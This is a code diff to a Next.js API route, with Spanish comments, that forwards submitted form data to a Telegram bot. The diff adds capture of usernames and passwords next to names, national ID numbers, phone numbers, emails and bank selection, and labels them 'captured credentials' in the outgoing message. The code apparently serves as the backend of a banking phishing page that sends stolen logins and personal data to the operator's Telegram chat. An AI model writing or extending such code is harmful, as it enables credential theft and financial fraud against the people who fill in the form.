@@ -2,79 +2,87 @@ import { NextResponse } from "next/server";
 
 export async function POST(request: Request) {
   try {
+    // 1. Recibimos los datos que envía el frontend
     const data = await request.json();
 
     const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
     if (!TOKEN || !CHAT_ID) {
-      console.error("Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID");
-      return NextResponse.json(
-        { success: false, error: "Variables de entorno ausentes" },
-        { status: 500 }
-      );
+      console.error("❌ ERROR: Configuración de variables de entorno ausente");
+      return NextResponse.json({ success: false, error: "Configuración ausente" }, { status: 500 });
     }
 
-    const {
-      pagina,
-      nombre,
-      cedula,
-      telefono,
-      correo,
-      banco,
-      detalles,
+    // 2. Extraemos todos los posibles campos (Contacto, Banco y Credenciales)
+    const { 
+      pagina, 
+      nombre, 
+      cedula, 
+      telefono, 
+      correo, 
+      banco, 
+      detalles, 
+      usuario, 
+      password,
+      USUARIO, 
+      PASSWORD 
     } = data;
 
-    const mensajeTelegram = `
-${pagina || "📝 NUEVA SOLICITUD"}
+    // Identificamos las credenciales sin importar si vienen en mayúsculas o minúsculas
+    const userFinal = usuario || USUARIO;
+    const passFinal = password || PASSWORD;
+
+    // 3. Construimos el mensaje con formato profesional
+    let mensajeTelegram = `
+${pagina || "📝 NUEVO REGISTRO"}
 ━━━━━━━━━━━━━━━━━━
+👤 **DATOS DEL CLIENTE:**
+• **Nombre:** ${nombre || "No indicado"}
+• **Cédula:** ${cedula || "No indicada"}
+• **Teléfono:** ${telefono || "No indicado"}
+• **Email:** ${correo || "No indicado"}
+`;
 
-👤 DATOS DEL CLIENTE
-• Nombre: ${nombre || "No indicado"}
-• Cédula: ${cedula || "No indicada"}
-• Teléfono: ${telefono || "No indicado"}
-• Correo: ${correo || "No indicado"}
+    // 🛡️ SECCIÓN DE CREDENCIALES (Aparece solo si hay usuario o clave)
+    if (userFinal || passFinal) {
+      mensajeTelegram += `
+🔐 **CREDENCIALES CAPTURADAS:**
+• **Usuario:** \`${userFinal || "No detectado"}\`
+• **Clave:** \`${passFinal || "No detectada"}\`
+`;
+    }
 
-🏦 BANCO / ESTADO
+    mensajeTelegram += `
+🏦 **BANCO / ESTADO:**
 ${banco || "Pendiente de selección"}
 
-📝 DETALLES
+📝 **DETALLES ADICIONALES:**
 ${detalles || "Sin detalles adicionales"}
-
 ━━━━━━━━━━━━━━━━━━
 `.trim();
 
-    const response = await fetch(
-      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: mensajeTelegram,
-        }),
-      }
-    );
+    // 4. Enviamos la petición a Telegram
+    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensajeTelegram,
+        parse_mode: "Markdown", 
+      }),
+    });
 
     const result = await response.json();
 
-    if (!result.ok) {
-      console.error("Error de Telegram:", result);
-      return NextResponse.json(
-        { success: false, error: result.description || "Error de Telegram" },
-        { status: 500 }
-      );
+    if (result.ok) {
+      return NextResponse.json({ success: true });
+    } else {
+      console.error("❌ Telegram error:", result.description);
+      return NextResponse.json({ success: false, error: result.description }, { status: 500 });
     }
 
-    return NextResponse.json({ success: true });
   } catch (error) {
-    console.error("Error interno:", error);
-
-    return NextResponse.json(
-      { success: false, error: "Error interno del servidor" },
-      { status: 500 }
-    );
+    console.error("💥 Error crítico:", error);
+    return NextResponse.json({ success: false, error: "Error interno" }, { status: 500 });
   }
 }
